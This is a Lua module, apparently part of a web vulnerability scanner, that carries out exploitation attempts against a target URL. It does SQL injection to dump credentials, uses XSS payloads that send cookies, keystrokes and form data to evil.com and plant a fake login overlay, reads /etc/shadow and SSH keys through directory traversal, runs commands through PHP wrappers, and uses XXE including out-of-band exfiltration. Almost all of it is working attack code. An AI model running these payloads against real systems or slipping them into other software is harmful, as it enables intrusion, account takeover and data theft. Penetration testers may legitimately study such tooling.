-- Exploitation Testing Module
local ExploitTests = {}

-- SQL Injection Exploitation
function ExploitTests.exploit_sql_injection(scanner, vuln_info)
    print("[*] Attempting to exploit SQL Injection vulnerability...")
    
    local exploitation_results = {
        success = false,
        extracted_data = {},
        database_info = {},
        table_info = {},
        exploitation_details = ""
    }
    
    -- Database fingerprinting payloads
    local db_fingerprint_payloads = {
        mysql = "' AND 1=0 UNION SELECT version(), database(), user()--",
        postgresql = "' AND 1=0 UNION SELECT version(), current_database(), current_user--",
        mssql = "' AND 1=0 UNION SELECT @@version, db_name(), user--",
        oracle = "' AND 1=0 UNION SELECT version FROM v$instance, ora_database_name, user FROM dual--"
    }
    
    -- Try to identify database type
    for db_type, payload in pairs(db_fingerprint_payloads) do
        local test_url = scanner.target_url .. "?id=" .. payload
        local response = scanner:http_request(test_url)
        
        if response.status == 200 and #response.body > 0 then
            exploitation_results.database_info.db_type = db_type
            exploitation_results.database_info.fingerprint_payload = payload
            exploitation_results.exploitation_details = exploitation_results.exploitation_details .. 
                "Database identified as: " .. db_type .. "\n"
            break
        end
    end
    
    -- Attempt to extract table names
    local table_extraction_payloads = {
        mysql = "' AND 1=0 UNION SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 5--",
        postgresql = "' AND 1=0 UNION SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database() LIMIT 5--",
        mssql = "' AND 1=0 UNION SELECT name FROM sysobjects WHERE xtype='U'--"
    }
    
    if exploitation_results.database_info.db_type then
        local db_type = exploitation_results.database_info.db_type
        local table_payload = table_extraction_payloads[db_type]
        
        if table_payload then
            local test_url = scanner.target_url .. "?id=" .. table_payload
            local response = scanner:http_request(test_url)
            
            if response.status == 200 then
                -- Extract table names from response
                for table_name in response.body:gmatch("([%w_]+)") do
                    if #table_name > 2 and table_name:match("^[%w_]+") then
                        table.insert(exploitation_results.table_info, table_name)
                    end
                end
                
                exploitation_results.exploitation_details = exploitation_results.exploitation_details .. 
                    "Extracted tables: " .. table.concat(exploitation_results.table_info, ", ") .. "\n"
            end
        end
    end
    
    -- Attempt to extract user credentials
    local credential_payloads = {
        "' AND 1=0 UNION SELECT user,password FROM users LIMIT 5--",
        "' AND 1=0 UNION SELECT username,password FROM user LIMIT 5--",
        "' AND 1=0 UNION SELECT email,password FROM accounts LIMIT 5--",
        "' AND 1=0 UNION SELECT login,pass FROM admin LIMIT 5--"
    }
    
    for _, payload in ipairs(credential_payloads) do
        local test_url = scanner.target_url .. "?id=" .. payload
        local response = scanner:http_request(test_url)
        
        if response.status == 200 and response.body:match("[%w_]+:[%w_]+") then
            exploitation_results.success = true
            
            -- Extract potential credentials
            for user, pass in response.body:gmatch("([%w_]+):([%w_@%.]+)") do
                table.insert(exploitation_results.extracted_data, {
                    username = user,
                    password = pass
                })
            end
            
            exploitation_results.exploitation_details = exploitation_results.exploitation_details .. 
                "Successfully extracted potential credentials using payload: " .. payload .. "\n"
            break
        end
    end
    
    return exploitation_results
end

-- XSS Exploitation
function ExploitTests.exploit_xss(scanner, vuln_info)
    print("[*] Attempting to exploit XSS vulnerability...")
    
    local exploitation_results = {
        success = false,
        payload_used = "",
        exploitation_details = "",
        proof_of_concept = ""
    }
    
    -- Advanced XSS payloads for exploitation
    local exploitation_payloads = {
        -- Cookie stealing payload
        "<script>document.location='http://evil.com/steal.php?c='+document.cookie</script>",
        
        -- Keylogger payload
        "<script>document.onkeypress=function(e){fetch('http://evil.com/log.php?k='+e.key)}</script>",
        
        -- Session hijacking payload
        "<script>fetch('http://evil.com/hijack.php',{method:'POST',body:JSON.stringify({session:document.cookie,url:window.location.href})})</script>",
        
        -- Form data theft
        "<script>document.forms[0].onsubmit=function(){fetch('http://evil.com/steal.php',{method:'POST',body:new FormData(this)})}</script>",
        
        -- Phishing form injection
        "<div style='position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999'><form action='http://evil.com/phish.php'><h1>Session Expired - Please Login</h1><input type='text' name='username' placeholder='Username'><input type='password' name='password' placeholder='Password'><input type='submit' value='Login'></form></div>"
    }
    
    for _, payload in ipairs(exploitation_payloads) do
        local test_url = scanner.target_url .. "?search=" .. payload
        local response = scanner:http_request(test_url)
        
        if response.status == 200 and response.body:match(payload) then
            exploitation_results.success = true
            exploitation_results.payload_used = payload
            exploitation_results.exploitation_details = "XSS payload successfully executed and reflected in response"
            
            -- Create proof of concept
            exploitation_results.proof_of_concept = string.format(
                "Exploit URL: %s\nPayload: %s\nImpact: This payload can be used to steal cookies, hijack sessions, or perform phishing attacks",
                test_url, payload
            )
            break
        end
    end
    
    return exploitation_results
end

-- Directory Traversal Exploitation
function ExploitTests.exploit_directory_traversal(scanner, vuln_info)
    print("[*] Attempting to exploit Directory Traversal vulnerability...")
    
    local exploitation_results = {
        success = false,
        extracted_files = {},
        exploitation_details = "",
        sensitive_data = {}
    }
    
    -- Target files for extraction
    local target_files = {
        unix = {
            "/etc/passwd",
            "/etc/shadow",
            "/etc/hosts",
            "/etc/apache2/apache2.conf",
            "/etc/nginx/nginx.conf",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "~/.ssh/id_rsa",
            "~/.bash_history"
        },
        windows = {
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
            "C:\\Windows\\win.ini",
            "C:\\Windows\\System32\\config\\SAM",
            "C:\\inetpub\\wwwroot\\web.config",
            "C:\\xampp\\apache\\conf\\httpd.conf",
            "C:\\wamp\\bin\\apache\\apache\\conf\\httpd.conf"
        }
    }
    
    -- Determine target OS based on previous scan results
    local target_os = "unix" -- default assumption
    
    -- Try to extract sensitive files
    local files_to_try = target_files[target_os] or target_files.unix
    
    for _, file_path in ipairs(files_to_try) do
        -- Create various traversal payloads
        local traversal_payloads = {
            "../../../.." .. file_path,
            "....//....//....//....//" .. file_path,
            "..%2f..%2f..%2f..%2f" .. file_path:gsub("/", "%2f"),
            "..%252f..%252f..%252f..%252f" .. file_path:gsub("/", "%252f")
        }
        
        for _, payload in ipairs(traversal_payloads) do
            local test_url = scanner.target_url .. "?file=" .. payload
            local response = scanner:http_request(test_url)
            
            if response.status == 200 and #response.body > 100 then
                exploitation_results.success = true
                
                local extracted_content = response.body:sub(1, 500) -- First 500 chars
                table.insert(exploitation_results.extracted_files, {
                    file_path = file_path,
                    content_preview = extracted_content,
                    payload_used = payload
                })
                
                -- Look for sensitive data patterns
                local sensitive_patterns = {
                    passwords = "password%s*[:=]%s*[%w_]+",
                    api_keys = "api[_-]?key%s*[:=]%s*[%w_]+",
                    database = "database%s*[:=]%s*[%w_]+",
                    usernames = "username%s*[:=]%s*[%w_]+",
                    emails = "[%w_%.%-]+@[%w_%.%-]+%.[%w_]+",
                    ip_addresses = "%d+%.%d+%.%d+%.%d+"
                }
                
                for pattern_name, pattern in pairs(sensitive_patterns) do
                    for match in response.body:gmatch(pattern) do
                        table.insert(exploitation_results.sensitive_data, {
                            type = pattern_name,
                            value = match
                        })
                    end
                end
                
                exploitation_results.exploitation_details = exploitation_results.exploitation_details ..
                    string.format("Successfully extracted file: %s using payload: %s\n", file_path, payload)
                break
            end
        end
    end
    
    return exploitation_results
end

-- File Inclusion Exploitation
function ExploitTests.exploit_file_inclusion(scanner, vuln_info)
    print("[*] Attempting to exploit File Inclusion vulnerability...")
    
    local exploitation_results = {
        success = false,
        lfi_results = {},
        rfi_attempts = {},
        exploitation_details = ""
    }
    
    -- LFI exploitation attempts
    local lfi_exploits = {
        {
            name = "PHP Filter Chain",
            payload = "php://filter/convert.base64-encode/resource=config.php",
            expected_result = "base64_encoded_php"
        },
        {
            name = "PHP Input Stream",
            payload = "php://input",
            post_data = "<?php system('id'); ?>",
            expected_result = "command_execution"
        },
        {
            name = "PHP Data Wrapper",
            payload = "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
            expected_result = "php_info"
        },
        {
            name = "Expect Wrapper",
            payload = "expect://id",
            expected_result = "command_execution"
        }
    }
    
    for _, exploit in ipairs(lfi_exploits) do
        local test_url = scanner.target_url .. "?include=" .. exploit.payload
        
        if exploit.post_data then
            local headers = {
                ["Content-Type"] = "application/x-www-form-urlencoded"
            }
            local response = scanner:http_request(test_url, "POST", headers, exploit.post_data)
            
            if response.status == 200 then
                if response.body:match("uid=%d+") or response.body:match("gid=%d+") then
                    exploitation_results.success = true
                    table.insert(exploitation_results.lfi_results, {
                        exploit_name = exploit.name,
                        payload = exploit.payload,
                        result = "Command execution successful",
                        output = response.body:sub(1, 200)
                    })
                end
            end
        else
            local response = scanner:http_request(test_url)
            
            if response.status == 200 then
                if exploit.expected_result == "base64_encoded_php" and response.body:match("[A-Za-z0-9+/]+") then
                    exploitation_results.success = true
                    table.insert(exploitation_results.lfi_results, {
                        exploit_name = exploit.name,
                        payload = exploit.payload,
                        result = "PHP source code extracted",
                        output = response.body:sub(1, 300)
                    })
                elseif exploit.expected_result == "php_info" and response.body:match("phpinfo") then
                    exploitation_results.success = true
                    table.insert(exploitation_results.lfi_results, {
                        exploit_name = exploit.name,
                        payload = exploit.payload,
                        result = "PHP info displayed",
                        output = "PHP info page content detected"
                    })
                elseif exploit.expected_result == "command_execution" and response.body:match("uid=%d+") then
                    exploitation_results.success = true
                    table.insert(exploitation_results.lfi_results, {
                        exploit_name = exploit.name,
                        payload = exploit.payload,
                        result = "Command execution successful",
                        output = response.body:sub(1, 200)
                    })
                end
            end
        end
    end
    
    exploitation_results.exploitation_details = string.format(
        "LFI exploitation completed. %d successful exploits found.",
        #exploitation_results.lfi_results
    )
    
    return exploitation_results
end

-- XXE Exploitation
function ExploitTests.exploit_xxe(scanner, vuln_info)
    print("[*] Attempting to exploit XXE vulnerability...")
    
    local exploitation_results = {
        success = false,
        extracted_files = {},
        exploitation_details = "",
        proof_of_concept = ""
    }
    
    local xxe_exploits = {
        {
            name = "File Extraction - /etc/passwd",
            payload = [[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo></foo>]]
        },
        {
            name = "File Extraction - Windows hosts",
            payload = [[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
]>
<foo></foo>]]
        },
        {
            name = "Out-of-Band Data Exfiltration",
            payload = [[<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://evil.com/xxe?data=%file;'>">
%eval;
%exfiltrate;
]>
<foo></foo>]]
        }
    }
    
    local headers = {
        ["Content-Type"] = "application/xml",
        ["Accept"] = "application/xml"
    }
    
    for _, exploit in ipairs(xxe_exploits) do
        local response = scanner:http_request(scanner.target_url, "POST", headers, exploit.payload)
        
        if response.status == 200 then
            -- Check for file content in error messages or response
            if response.body:match("root:x:") or response.body:match("localhost") then
                exploitation_results.success = true
                
                table.insert(exploitation_results.extracted_files, {
                    exploit_name = exploit.name,
                    content_preview = response.body:sub(1, 300),
                    status_code = response.status
                })
                
                exploitation_results.exploitation_details = exploitation_results.exploitation_details ..
                    string.format("Successfully exploited XXE using: %s\n", exploit.name)
            end
        end
    end
    
    exploitation_results.proof_of_concept = string.format(
        "XXE exploitation attempted. %d successful file extractions found.",
        #exploitation_results.extracted_files
    )
    
    return exploitation_results
end

-- Main exploitation function
function ExploitTests.run_exploitation(scanner, vulnerability)
    print(string.format("[*] Running exploitation tests for %s vulnerability...", vulnerability.name))
    
    local exploit_result = {
        vulnerability_name = vulnerability.name,
        exploitation_attempted = true,
        exploitation_successful = false,
        exploitation_details = "",
        risk_assessment = "",
        recommendations = ""
    }
    
    -- Route to appropriate exploitation function
    if vulnerability.name:match("SQL Injection") then
        local result = ExploitTests.exploit_sql_injection(scanner, vulnerability)
        exploit_result.exploitation_successful = result.success
        exploit_result.exploitation_details = result.exploitation_details
        exploit_result.extracted_data = result.extracted_data or {}
        exploit_result.risk_assessment = result.success and "CRITICAL - Database compromise possible" or "HIGH - Exploitation failed"
        exploit_result.recommendations = "Implement parameterized queries and input validation immediately"
        
    elseif vulnerability.name:match("XSS") then
        local result = ExploitTests.exploit_xss(scanner, vulnerability)
        exploit_result.exploitation_successful = result.success
        exploit_result.exploitation_details = result.exploitation_details
        exploit_result.proof_of_concept = result.proof_of_concept
        exploit_result.risk_assessment = result.success and "HIGH - Session hijacking possible" or "MEDIUM - Exploitation failed"
        exploit_result.recommendations = "Implement proper input validation and output encoding"
        
    elseif vulnerability.name:match("Directory Traversal") then
        local result = ExploitTests.exploit_directory_traversal(scanner, vulnerability)
        exploit_result.exploitation_successful = result.success
        exploit_result.exploitation_details = result.exploitation_details
        exploit_result.extracted_files = result.extracted_files or {}
        exploit_result.sensitive_data = result.sensitive_data or {}
        exploit_result.risk_assessment = result.success and "CRITICAL - File system access" or "HIGH - Exploitation failed"
        exploit_result.recommendations = "Implement proper input validation and file access controls"
        
    elseif vulnerability.name:match("File Inclusion") then
        local result = ExploitTests.exploit_file_inclusion(scanner, vulnerability)
        exploit_result.exploitation_successful = result.success
        exploit_result.exploitation_details = result.exploitation_details
        exploit_result.lfi_results = result.lfi_results or {}
        exploit_result.risk_assessment = result.success and "CRITICAL - Remote code execution possible" or "HIGH - Exploitation failed"
        exploit_result.recommendations = "Disable dangerous PHP wrappers and validate file inclusion"
        
    elseif vulnerability.name:match("XXE") then
        local result = ExploitTests.exploit_xxe(scanner, vulnerability)
        exploit_result.exploitation_successful = result.success
        exploit_result.exploitation_details = result.exploitation_details
        exploit_result.extracted_files = result.extracted_files or {}
        exploit_result.risk_assessment = result.success and "CRITICAL - File system access" or "HIGH - Exploitation failed"
        exploit_result.recommendations = "Disable external entity processing in XML parser"
        
    else
        exploit_result.exploitation_attempted = false
        exploit_result.exploitation_details = "No exploitation available for this vulnerability type"
        exploit_result.risk_assessment = vulnerability.severity:upper() .. " - Manual verification required"
        exploit_result.recommendations = "Perform manual security testing and implement appropriate controls"
    end
    
    return exploit_result
end

return ExploitTests